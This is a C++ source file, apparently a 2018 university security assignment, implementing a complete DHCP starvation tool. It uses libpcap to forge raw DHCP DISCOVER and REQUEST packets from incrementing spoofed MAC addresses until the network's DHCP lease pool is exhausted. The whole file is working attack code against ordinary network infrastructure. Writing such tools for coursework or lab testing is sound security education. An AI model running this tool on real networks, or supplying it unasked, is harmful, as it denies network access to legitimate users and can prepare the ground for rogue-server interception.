/**
 * @author Frantisek Sumsal <xsumsa01@stud.fit.vutbr.cz>
 * @date 21.4.2018
 * @file dhcpstarve.cpp
 */
#include <cstring>
#include <iostream>
#include <pcap.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#define __FAVOR_BSD
#include <netinet/udp.h>
#include <signal.h>
#include <unistd.h>

#include "dhcp.h"

#define ALARM_TIMEOUT 10

pcap_t *pcap_h;   /*<< pcap handler */
uint8_t exp_type; /*<< Expected type of DHCP response */
uint32_t ip;      /*<< Received IP address */
uint32_t srv_ip;  /**< Received DHCP server IP address */

/**
 * @brief Handler for SIGALRM
 * @details When DHCP sever is out of IP addresses, it won't respond to our
 *          requests - setting an alarm() with a timeout will make sure
 *          we won't wait indefinitely
 *
 * @param sig Signal number
 */
void timeout_handler(int sig)
{
    puts("Timeout reached - DHCP pool is probably depleted");
    exit(EXIT_SUCCESS);
}

/**
 * @brief Increment given MAC address by 1
 * @details Overflow in one field is carried to the next one
 *
 * @param mac_addr Valid pointer to mac_addr_t structure
 */
void increment_mac(mac_addr_t *mac_addr)
{
    for(int8_t i = 5; i >= 0; i--) {
        if(++(*mac_addr)[i] != 0)
            break;
    }
}

/**
 * @brief Handler function for pcap_loop()
 * @details This function parses relevant incoming packets
 */
void dhcp_input_handler(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *frame)
{
    struct ether_header *eth_header = (struct ether_header*)frame;
    struct ip *ip_header;
    struct udphdr *udp_header;
    dhcp_t *dhcp_data;

    // Check if we got IP packet
    if(htons(eth_header->ether_type) != ETHERTYPE_IP)
        return;

    ip_header = (struct ip*)((uint8_t*)eth_header + sizeof(struct ether_header));
    // Check if the protocol is UDP
    if(ip_header->ip_p != IPPROTO_UDP)
        return;

    udp_header = (struct udphdr*)((uint8_t*)ip_header + sizeof(struct ip));
    // Check if the packet for DHCP port
    if(ntohs(udp_header->uh_sport) != DHCP_SERVER_PORT)
        return;

    dhcp_data = (dhcp_t*)((uint8_t*)udp_header + sizeof(struct udphdr));
    // Check if the DHCP packet is a reply packet
    if(dhcp_data->op != DHCP_BOOTREPLY)
        return;

    // Check for NAK from DHCP server
    if(dhcp_data->options[2] == DHCP_OPT_NAK) {
        printf("Received NAK for IP " IPFMT "\n", IPARGS(ip));
        printf("=> DHCP server is probably out out of leases\n");
        exit(EXIT_SUCCESS);
    }

    // Check if the reply is of expected type (OFFER/ACK)
    if(dhcp_data->options[2] != exp_type)
        return;

    if(dhcp_data->options[2] == DHCP_OPT_OFFER) {
        // Get the IPs from the DHCP OFFER packet
        ip = ntohl(dhcp_data->yiaddr);
        srv_ip = ntohl(dhcp_data->siaddr);
        printf("Received OFFER with IP " IPFMT " and server IP " IPFMT "\n",
                IPARGS(ip), IPARGS(srv_ip));
    } else if(dhcp_data->options[2] == DHCP_OPT_ACK) {
        printf("Received ACK for IP " IPFMT "\n", IPARGS(ip));
    }

    // Break the capture loop
    pcap_breakloop(pcap_h);
}

/**
 * @brief Build a DHCP REQUEST header field
 *
 * @param dhcp_data Valid pointer to dhcp_t structure
 * @param mac_addr Valid pointer to a device MAC address
 * @param packet_size Valid pointer to packet size, which will be updated accordingly
 */
void dhcp_build_request(dhcp_t *dhcp_data, mac_addr_t *mac_addr, int *packet_size)
{
    int opt_len = 0;
    uint8_t byte;
    uint32_t dword;

    byte = DHCP_OPT_REQUEST;
    dhcp_set_option(dhcp_data->options, 53, 1, &byte, &opt_len);
    dword = htonl(ip);
    dhcp_set_option(dhcp_data->options, 50, 4, &dword, &opt_len);
    dword = htonl(srv_ip);
    dhcp_set_option(dhcp_data->options, 54, 4, &dword, &opt_len);
    byte = 0;
    dhcp_set_option(dhcp_data->options, 255, 1, &byte, &opt_len);

    *packet_size += sizeof(dhcp_t) + opt_len;
    dhcp_data->op = DHCP_BOOTREQUEST; // DHCP BOOTREQUEST
    dhcp_data->htype = 1; // DHCP HW type 10 Ethernet;
    dhcp_data->hlen = 6; // Header length
    dhcp_data->siaddr = htonl(srv_ip);
    memcpy(dhcp_data->chaddr, mac_addr, sizeof(*mac_addr)); // MAC address
    dhcp_data->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
}

/**
 * @brief Build a DHCP DISCOVER header field
 *
 * @param dhcp_data Valid pointer to dhcp_t structure
 * @param mac_addr Valid pointer to a device MAC address
 * @param packet_size Valid pointer to packet size, which will be updated accordingly
 */
void dhcp_build_discover(dhcp_t *dhcp_data, mac_addr_t *mac_addr, int *packet_size)
{
    int opt_len = 0;
    uint8_t byte;

    byte = DHCP_OPT_DISCOVER;
    dhcp_set_option(dhcp_data->options, 53, 1, &byte, &opt_len);
    byte = 0;
    dhcp_set_option(dhcp_data->options, 255, 1, &byte, &opt_len);

    *packet_size += sizeof(dhcp_t) + opt_len;
    dhcp_data->op = DHCP_BOOTREQUEST; // DHCP BOOTREQUEST
    dhcp_data->htype = 1; // DHCP HW type 10 Ethernet;
    dhcp_data->hlen = 6; // Header length
    memcpy(dhcp_data->chaddr, mac_addr, sizeof(*mac_addr)); // MAC address
    dhcp_data->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
}

/**
 * @brief Send a DHCP packet of a type with given MAC address
 *
 * @param mac_addr Valid pointer to a device MAC address
 * @param type DHCP packet type (DHCP_OPT_DISCOVER or DHCP_OPT_REQUEST)
 *
 * @returns 0 on success, non-zero otherwise
 */
int dhcp_send_packet(mac_addr_t *mac_addr, int8_t type)
{
    int rc;
    int packet_size = 0;
    uint8_t packet[4096] = {0, };
    struct ether_header *eth_header;
    struct ip *ip_header;
    struct udphdr *udp_header;
    dhcp_t *dhcp_data;

    // Calculate header offsets in the packet
    // packet = ether_header + ip_header + udp_header + dhcp_data
    eth_header = (struct ether_header*) packet;
    ip_header = (struct ip*)((uint8_t*)eth_header + sizeof(struct ether_header));
    udp_header = (struct udphdr*)((uint8_t*)ip_header + sizeof(struct ip));
    dhcp_data = (dhcp_t*)((uint8_t*)udp_header + sizeof(struct udphdr));

    // Set DHCP data
    if(type == DHCP_OPT_DISCOVER) {
        dhcp_build_discover(dhcp_data, mac_addr, &packet_size);
        printf("Sending DISCOVER with MAC " MACFMT "\n", MACARGS(*mac_addr));
    } else if(type == DHCP_OPT_REQUEST) {
        dhcp_build_request(dhcp_data, mac_addr, &packet_size);
        printf("Sending REQUEST with MAC " MACFMT " and IP " IPFMT "\n",
                MACARGS(*mac_addr), IPARGS(ip));
    }

    // Set UDP header
    // padding
    if(packet_size & 1)
        packet_size++;
    packet_size += sizeof(struct udphdr);
    udp_header->uh_sport = htons(DHCP_CLIENT_PORT); // Source port
    udp_header->uh_dport = htons(DHCP_SERVER_PORT); // Destination port
    udp_header->uh_ulen = htons(packet_size); // Total length
    udp_header->uh_sum = 0;

    // Set IP header
    packet_size += sizeof(struct ip);
    ip_header->ip_dst.s_addr = 0xffffffff; // 255.255.255.255 (bcast)
    ip_header->ip_hl = sizeof(struct ip) >> 2; // Header length
    ip_header->ip_id = htons(0xffff); // Identification
    ip_header->ip_len = htons(packet_size); // Total length
    ip_header->ip_off = 0; // Fragment offset field
    ip_header->ip_sum = 0; // Checksum (must be set to 0 before settin real checksum)
    ip_header->ip_src.s_addr = 0; // 0.0.0.0
    ip_header->ip_ttl = 16; // Time to live
    ip_header->ip_tos = 0x10; // Type of service
    ip_header->ip_v = IPVERSION; // IP version = 4
    ip_header->ip_p = IPPROTO_UDP; // Use UDP protocol

    ip_header->ip_sum = in_cksum((unsigned short*) ip_header, sizeof(struct ip));

    // Set ethernet header
    packet_size += sizeof(struct ether_header);
    memcpy(eth_header->ether_shost, mac_addr, sizeof(mac_addr_t));
    memset(eth_header->ether_dhost, -1, sizeof(mac_addr_t));
    eth_header->ether_type = htons(ETHERTYPE_IP);

    // Send the packet
    rc = pcap_inject(pcap_h, packet, packet_size);
    if(rc <= 0) {
        pcap_perror(pcap_h, "pcap_inject()");
        return 1;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    if(argc != 3 || strcmp(argv[1], "-i") != 0) {
        printf("Usage: %s -i interface\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *interface = argv[2];
    char pcap_err[PCAP_ERRBUF_SIZE];
    mac_addr_t mac_addr = {0x00, };

    signal(SIGALRM, timeout_handler);

    pcap_h = pcap_open_live(interface, BUFSIZ, 0, 10, pcap_err);
    if(pcap_h == NULL) {
        fprintf(stderr, "Couldn't open interface %s: %s\n",
                interface, pcap_err);
        exit(EXIT_FAILURE);
    }

    while(1) {
        increment_mac(&mac_addr);
        ip = 0;

        exp_type = DHCP_OPT_OFFER;
        if(dhcp_send_packet(&mac_addr, DHCP_OPT_DISCOVER) != 0)
            exit(EXIT_FAILURE);

        alarm(ALARM_TIMEOUT);
        pcap_loop(pcap_h, -1, dhcp_input_handler, NULL);
        alarm(0);

        exp_type = DHCP_OPT_ACK;
        if(dhcp_send_packet(&mac_addr, DHCP_OPT_REQUEST) != 0)
            exit(EXIT_FAILURE);

        alarm(ALARM_TIMEOUT);
        pcap_loop(pcap_h, -1, dhcp_input_handler, NULL);
        alarm(0);

        printf("\n");
    }

    pcap_close(pcap_h);

    return 0;
}
